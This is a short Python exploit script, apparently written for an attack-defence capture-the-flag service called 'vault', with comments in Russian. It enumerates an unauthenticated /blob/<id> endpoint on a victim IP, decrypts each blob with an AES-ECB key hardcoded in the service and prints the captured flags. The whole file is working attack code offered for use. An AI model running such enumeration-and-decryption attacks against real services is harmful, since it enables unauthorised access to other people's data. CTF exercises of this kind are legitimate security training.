#!/usr/bin/env python3
"""vault — слабая крипта. GET /blob/<id> отдаёт шифротекст без авторизации,
ключ AES зашит в образ (одинаков у всех), AES-ECB. Качаем чужие blob'ы и
расшифровываем. Запуск: vault.py <ip_жертвы> [порт]  (флаги построчно в stdout).
Нужен pycryptodome (см. requirements.txt)."""
import os
import re
import sys

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

FLAG = re.compile(os.environ.get("FLAG_FORMAT", r"[A-Z0-9]{31}="))
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "5003"))
BASE = f"http://{HOST}:{PORT}"
KEY = b"dojo-fixed-key!!"   # тот самый ключ из services/vault/app.py

flags = set()
for i in range(1, 400):
    try:
        r = requests.get(f"{BASE}/blob/{i}", timeout=2)
    except requests.RequestException:
        break
    if r.status_code != 200:
        continue
    try:
        ct = bytes.fromhex(r.json()["ciphertext"])
        pt = unpad(AES.new(KEY, AES.MODE_ECB).decrypt(ct), 16)
    except Exception:
        continue
    flags.update(FLAG.findall(pt.decode(errors="ignore")))

for f in sorted(flags):
    print(f)
